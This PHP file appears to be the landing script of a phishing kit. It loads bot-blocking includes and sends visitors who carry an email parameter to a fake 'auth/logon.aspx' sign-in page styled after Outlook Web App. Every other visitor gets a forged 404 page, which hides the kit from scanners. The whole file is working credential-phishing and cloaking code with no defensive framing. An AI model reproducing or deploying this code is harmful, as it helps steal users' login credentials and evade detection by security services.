<?php
include('blocker.php');
include('bot/antibots1.php');
include('bot/antibots2.php');
include('bot/antibots3.php');
include('bot/antibots4.php');
include('bot/antibots5.php');
include('bot/antibots6.php');

$mail = $loc = '';
if(isset($_GET['email'])) {
	//$mail = base64_decode($_GET['email']);
	$mail = $_GET['email'];
	if($mail !== false) {
		$loc = "auth/logon.aspx?replaceCurrent=1&reason=2&url=$mail";
		header("Location: $loc");
	}
} else {
    header("HTTP/1.1 404 Not found");
    $content  = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . PHP_EOL;
    $content .= '<HTML><HEAD>' . PHP_EOL;
    $content .= '<TITLE>404 Not Found</TITLE>' . PHP_EOL;
    $content .= '</HEAD><BODY>' . PHP_EOL;
    $content .= '<H1>Not Found</H1>'  . PHP_EOL;
    $content .= 'The requested URL ' . @$_SERVER["REQUEST_URI"] . ' was not found on this server.' . PHP_EOL;
    $content .= '<HR>' . PHP_EOL;
    $content .= '<I>' . @$_SERVER["HTTP_HOST"] . '</I>' . PHP_EOL;
    $content .= '</BODY></HTML>';
    die($content);	
}
?>
